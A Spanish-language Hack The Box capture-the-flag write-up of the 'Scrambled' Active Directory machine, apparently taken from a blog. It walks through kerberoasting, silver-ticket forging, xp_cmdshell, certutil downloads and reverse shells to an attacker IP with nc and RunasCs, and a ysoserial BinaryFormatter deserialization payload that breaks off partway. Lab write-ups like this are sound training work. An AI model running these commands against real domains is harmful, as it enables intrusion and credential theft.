---
tags:
permalink: /Scrambled-HTB-Writeup
title: Scrambled - Medium (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,9389,49667,49674,49698,49707 10.129.233.204
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 16:07 -0300
Nmap scan report for 10.129.233.204
Host is up (0.96s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-09 19:09:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-09T19:12:54+00:00; +1m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-01-09T19:12:53+00:00; +1m32s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.233.204:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-01-09T19:12:54+00:00; +1m32s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-09T19:08:24
|_Not valid after:  2056-01-09T19:08:24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-01-09T19:12:54+00:00; +1m32s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-09T19:12:53+00:00; +1m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.98%I=7%D=1/9%Time=69615202%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCRA
SF:MBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOW
SF:N_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLSS
SF:essionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourOh
SF:FourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;
SF:\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk-
SF:RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1m31s, deviation: 0s, median: 1m31s
| smb2-time: 
|   date: 2026-01-09T19:12:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.45 seconds
```

## Website 

Nada en la pagina principal.

![image-center](/assets/images/Pasted image 20260109160831.png)

Sin embargo si bajo un poco veo links a varias rutas.

![image-center](/assets/images/Pasted image 20260109161136.png)
### Validate user

En una de las mismas se ve una imagen de una consola que se ejecuta como el usuario `ksimpson`.

![image-center](/assets/images/Pasted image 20260109161221.png)

Validando si el tiene la misma password que su propio nombre veo que si.

```bash
nxc smb DC1.scrm.local -u 'ksimpson' -p 'ksimpson' -k
SMB         DC1.scrm.local  445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson 
```
## Shell as sqlsvc

Por lo que solicite un ticket, ya que la autenticación `ntlm` esta deshabilitada, como se puede ver mas adelante.

```bash
impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.129.233.204   
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache
                                                                                                                                     
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/scrambled]
└─# export KRB5CCNAME=ksimpson.ccache
```
### Shares enumeration

Use las mismas credenciales para enumerar `Shares`.

```bash
nxc smb DC1.scrm.local -u 'ksimpson' -p 'ksimpson' -k --shares --generate-krb5-file krb5.conf
SMB         DC1.scrm.local  445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson 
SMB         DC1.scrm.local  445    DC1              [*] Enumerated shares
SMB         DC1.scrm.local  445    DC1              Share           Permissions     Remark
SMB         DC1.scrm.local  445    DC1              -----           -----------     ------
SMB         DC1.scrm.local  445    DC1              ADMIN$                          Remote Admin
SMB         DC1.scrm.local  445    DC1              C$                              Default share
SMB         DC1.scrm.local  445    DC1              HR                              
SMB         DC1.scrm.local  445    DC1              IPC$            READ            Remote IPC
SMB         DC1.scrm.local  445    DC1              IT                              
SMB         DC1.scrm.local  445    DC1              NETLOGON        READ            Logon server share 
SMB         DC1.scrm.local  445    DC1              Public          READ            
SMB         DC1.scrm.local  445    DC1              Sales                           
SMB         DC1.scrm.local  445    DC1              SYSVOL          READ            Logon server share 
```

Como veo que en `Public` tengo permisos de lectura me conecte con `smbclient` de impacket, y me descargue el archivo `pdf` dentro del mismo.

```bash
impacket-smbclient scrm.local/ksimpson:ksimpson@DC1.scrm.local -dc-ip 10.129.233.204 -k
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 19:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 19:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 14:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf

```

En el mismo `pdf` como se puede ver, se habla de que la autenticación `ntlm` debido a los ataques `NTLM Relaying`. Además por temas de seguridad también removieron el acceso a todos los usuarios excepto a los administradores, para la conexión de la base de datos de `mssql`.

```bash
Scramble Corp
ADDITIONAL SECURITY MEASURES
Date: 04/09/2021
FAO: All employees
Author: IT Support
As you may have heard, our network was recently compromised and an attacker was able to access
all of our data. We have identified the way the attacker was able to gain access and have made some
immediate changes. You can find these listed below along with the ways these changes may impact
you.
Change: As the attacker used something known as "NTLM relaying", we have disabled NTLM
authentication across the entire network.
Users impacted: All
Workaround: When you log on or access network resources you will now be using Kerberos
authentication (which is definitely 100% secure and has absolutely no way anyone could exploit it).
This will require you to use the full domain name (scrm.local) with your username and any server
names you access.
Change: The attacker was able to retrieve credentials from an SQL database used by our HR software
so we have removed all access to the SQL service for everyone apart from network administrators.
Users impacted: HR department
Workaround: If you can no longer access the HR software please contact us and we will manually
grant your account access again.
```
### Users file

Use `rpcclient` para enumerar usuarios validos de dominio.

```bash
rpcclient -U 'ksimpson' DC1.scrm.local --use-kerberos=required --realm scrm.local
Password for [WORKGROUP\ksimpson]:
rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[tstar] rid:[0x452]
user:[asmith] rid:[0x453]
user:[sjenkins] rid:[0x45e]
user:[sdonington] rid:[0x45f]
user:[backupsvc] rid:[0x641]
user:[jhall] rid:[0x643]
user:[rsmith] rid:[0x644]
user:[ehooker] rid:[0x645]
user:[khicks] rid:[0x64b]
user:[sqlsvc] rid:[0x64d]
user:[miscsvc] rid:[0x651]
user:[ksimpson] rid:[0x653]
```
### Kerberoasting

Con el output cree esta expresion la cual me limpia todo para crear una lista de usuarios.

```bash
cat users | awk '{print $1}' | tr ':' ' ' | awk '{print $2}' | tr -d '[]' | sponge users
```

Con la misma lista performe un `kerberoasting attack` con `GetUserSPNs`.

```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -usersfile users -dc-ip 10.129.233.204 -request -k
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: tstar - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: asmith - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: sjenkins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: sdonington - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: backupsvc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jhall - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: rsmith - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ehooker - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: khicks - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$sqlsvc*$ca9d2be6c72f22bc20cdbe9b0f30299a$09b51b22bd35e6777825393b4241dce8dce319633cb4415b84ee68b2c1598b78096d4eabe2cb3dbbd204355d096380ed5fdaec1de13dd59564f893f13f9587a9f3c800fa1f2d8e3ece98dd6eeb3f4c078c127277007aa32cd0b105d14560417946784d9736cf4d385f07f0f67a67c385468cb7dd7e7c5582f1f44808d5ee58de4d4d59756eefc39a1ba7e909523a3125e5dcd772773176d92e98fd36768f56e87bd8f8112890f468caa92320bd56d641b6518681a2aa0e787dba66b00bb56c3900a92059cf46bededafc9e1b5ae24dcabc53f281e0e2bf5b78b0172b0de552a3a47e33b02d9e2d3d29e611c6c00422b9ed94c8ee7cece6922343dcb23da661d80f5caacb8d03d7fdc5e8abccbfd2838002a9e8222afcbe6dae2a77d96eeeb1c25afc93c7423d17b7c22661855a9e9fd19f5b13e5e2a1121566ae4dafa7e60d4075002ce4f2ffa891a1ef7b2d0c6468a451fd691822021aed1c1c5be0aaea799651572ee9ca72a84367fc3101d6c66ff0b2c894b4e8a3ad823a4d7c867982bdcfc47ba2c4f50b6969e50fdb011c3d66e0f5ac876f364c292536b82fa059a51b5d90ed9d9fd3c21f374f554b83fd9bd9723219da01669afbaaffdc06ae5f8ba0fd15bbc699431cf549fcebc787742e37af1a437d095ab2ec9255ca76e0dbac35ae8aaeee61dd45cb0a9a4d629eb1eaab9e21e69f7bc5297c32d05fb95b0245209cd85da6b99d0a2b2266e6d48c942f351f9ebec8f69576afa5c04e24ae99cb0e8a6f8a3141f7d762e16b52333ba67eee8c6061a20cf28fa3937205b67cd2cbb999afdabfebb4020eea97c06ec89af25b027b01ba59a57622a246da4afb612dba7a6d9d6e34e6ca06e4e942918cfbf86b0af7b368a9578cdf2ae4198559fa24ba44ea2b99f5ea552d5fa8bdf27e6ae4222b942c61af895cc9d756430a42bd49039152055a89a231e12160848292c6a4f44018c1f1b884848132da5b5c65dd08593268a70d1daa5f4369f5be267cb2a21ea3757772e97d5ab253e7dafa60c81523689161854fee8b2133574e2a9d27cce01cf0e91494048c3d0d7649902dd8f64549436c86a12a4c1d8017055a36b03bb43a2aaf4a5641261cdd9ddf9e823dea7869f0d6e67c659de3dfbf2ff63c72888bd852eae5141c380071d3756c7a87574c770ee6c0488e7daf1a60bc6e89ad1bd23458108c8dfe683041ea84ddf54a1b264d6ff60e4319a4ef4a7e4d8b851381e09696fe933cbfdb493ff30716b9978111fcd8819f2ee13d32a6be518bb2d99c494f95b9962f16abdb30701866cd1384938819bcddb35c1ab7d66cd6fa55f6c3647771530134d514c9770694344e4b6736c16bc56ea5ff7deafea44a349f0a34a7098e3c4bcad35775bbb0d6cb2840be32b60b8e9409fc501cb9180c86c5c07e6591374bb35dddaea63981bd9a
<SNIP>
```

Con el hash del usuario `sqlsvc` use john para romper el mismo.

```bash
john has --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)     
1g 0:00:00:04 DONE (2026-01-09 16:27) 0.2375g/s 2548Kp/s 2548Kc/s 2548KC/s Penrose..Pearce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Silver ticket attack

Debido a que no tengo acceso a `mssql` ya que como menciono el mensaje deshabilitaron el acceso a todos los usuarios, cuento con la password de una cuenta de servicio para esa base de datos, lo que me permite a mi obtener datos específicos del dominio como el `SID`, y el `hash NT` del usuario con el que poseo credenciales, haciendo que yo pueda hacer un `Silver Ticket Attack`, con el que puedo solicitar un `TGS` para un usuario el que quiera impersonar para `x` servicio de Windows.

Para obtener el hash calculo con `iconv` pasándole la password que obtuve.

```bash
iconv -f ascii -t utf16le <(printf 'Pegasus60') | openssl dgst -md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

Luego para obtener el `SID` del dominio use `lookupsid`.

```bash
impacket-lookupsid scrm.local/sqlsvc:Pegasus60@DC1.scrm.local -target-ip 10.129.233.204 -k
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at DC1.scrm.local
[*] StringBinding ncacn_np:DC1.scrm.local[\pipe\lsarpc]
[-] CCache file is not found. Skipping...
[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200
```
### Forge TGS

Y ya con todos los datos, puedo solicitar un `TGS` para impersonar el usuario `administrator`.

```bash
impacket-ticketer -nthash 'b999a16500b87d17ec7f2e2a68778f05' -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -domain scrm.local -spn 'MSSQLSvc/scrm.local:1433' administrator 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```
### Enable xp_cmdshell

Ahora con el ticket exportado a la variable de `Kerberos`, me conecte a la base de datos con `mssqlclient`.

```bash
impacket-mssqlclient -k -no-pass scrm.local/administrator@scrm.local
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 
```

Luego habilite el componente `xp_cmdshell` para poder ejecutar comandos.

```
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output        
-----------   
scrm\sqlsvc   
NULL 
```
### Shell

Y ahora que tengo ejecución de comandos me descargue el `nc.exe` en la maquina.

```bash
 xp_cmdshell certutil.exe -urlcache -split -f http://10.10.17.19/nc.exe C:\programdata\nc.exe
output                                                
---------------------------------------------------   
****  Online  ****                                    
  0000  ...                                           
  6e00                                                
CertUtil: -URLCache command completed successfully.   
NULL    
```

Y luego me envié la shell.

```powershell
 rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.233.204] 52941
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
scrm\sqlsvc
```
## Shell as MiscSvc

Luego conseguí acceso como el usuario `MiscSvc` usando las credenciales que halle en la base de datos.

```bash
SQL (SCRM\administrator  dbo@master)> enum_db
name         is_trustworthy_on   
----------   -----------------   
master                       0   
tempdb                       0   
model                        0   
msdb                         1   
ScrambleHR                   0   
SQL (SCRM\administrator  dbo@master)> use ScrambleHR
ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
TABLE_NAME   
----------   
Employees    
UserImport   
Timesheets   
SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT * FROM UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0 
```

Pero para el acceso debido a que el puerto `5985` no esta abierto, use `RunasCs.exe`.

```powershell
C:\Windows\system32>certutil -urlcache -split -f http://10.10.17.19/RunasCs.exe C:\programdata\RunasCs.exe
certutil -urlcache -split -f http://10.10.17.19/RunasCs.exe C:\programdata\RunasCs.exe
****  Online  ****
  0000  ...
  ca00
CertUtil: -URLCache command completed successfully.
```
### Shell

Con el siguiente comando envié el flujo a mi `ip`.

```powershell
PS C:\ProgramData> .\RunasCs.exe MiscSvc 'ScrambledEggs9900' cmd.exe -r 10.10.17.19:4444 -l 3
.\RunasCs.exe MiscSvc 'ScrambledEggs9900' cmd.exe -r 10.10.17.19:4444 -l 3
[*] Warning: LoadUserProfile failed due to insufficient permissions

[+] Running in session 0 with process function CreateProcessAsUserW()
[+] Using Station\Desktop: Service-0x0-83634$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3704 created in background.

```

Y desde mi listener recibí la conexión.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.233.204] 54092
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
scrm\miscsvc
```

```powershell
C:\Users\miscsvc\Desktop>type user.txt
type user.txt
91209f348f08c2e599eabbf3fd00c77f
```
## Shell as nt authority\system

Veo que el output de `winPEAS` me devolvió un binario no común en el sistema.

```powershell

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                             
    ScrmOrders(Scramble Sales Orders Server)[C:\Program Files\ScrambleCorp\SalesOrdersService\ScrambleServer.exe 4411] - Auto - Running - No quotes and Space detected         
```

Así que me baje ambos componentes a mi maquina para analizarlos.

```powershell
PS C:\shares\it\apps\Sales Order Client> ls


    Directory: C:\shares\it\apps\Sales Order Client


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                                    
-a----       05/11/2021     20:52          19456 ScrambleLib.dll 
```

### Reverse engineering

Corriendo el `.exe` me pide credenciales, donde probando las mismas del usuario `misc` o del propio `sqlsvc` no son validas.

![image-center](/assets/images/Pasted image 20260109181249.png)
### Credentials

Me baje el binario a mi maquina para analizarlo, y veo la función `Logon`.

![image-center](/assets/images/Pasted image 20260109180320.png)

Clickeando en la misma veo que se hace una comparativa con el usuario `scrmdev`, viendo que si proveo el usuario, no hace falta una contraseña.

```c#
public bool Logon(string Username, string Password)
{
    bool result;
    try
    {
        if (string.Compare(Username, "scrmdev", true) == 0)
        {
            Log.Write("Developer logon bypass used");
            result = true;
        }
        else
        {
            ...[snip]...
        }
```

### Deserealization Attack

Veo una seccion en la que puedo cargar nuevas ordenes.

![image-center](/assets/images/Pasted image 20260109181617.png)

Además puedo ver en el propio binario, que se envían los datos de forma serializada en `base64`.

![image-center](/assets/images/Pasted image 20260109182215.png)

La misma luego se deserealiza en formato `Binary Format`

![image-center](/assets/images/Pasted image 20260109180440.png)
### Send data

Primero para enviar la data maliciosa `(el cual es mi plan)`, debo saber de que manera se hace es así, como veo que en la función `UploadOrder`, veo que se envía un parámetro o variable seguido de la data `(base64)`
`
![image-center](/assets/images/Pasted image 20260109182436.png)

Con el parámetro `UPLOAD_ORDER` puedo hacerlo, de manera que la data se envía serializada y luego el servidor la deserealiza ejecutándola.

![image-center](/assets/images/Pasted image 20260109182442.png)

Se puede ver en `ScrambleNetResponse` que primero se envia el tipo de solicitud `(UPLOAD_ORDER)`, seguido de `;` y luego, la data que queremos.

![image-center](/assets/images/Pasted image 20260109182458.png)

Para crear el payload serializado use `ysoserial`, colocando el gadget `TypeConfuseDelegate` y luego en el parámetro `-f` el formateador de serialización, luego como data envié un comando el cual ejecuta con `cmd` un binario .exe el cual cree con `msfvenom` y subí a la maquina.

```powershell
PS C:\temp\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd.exe /C C:\ProgramData\rev.exe' -o base64
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAACQvYyBjbWQuZXhlIC9DIEM6XFByb2dyYW1EYXRhXHJldi5leGUGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVy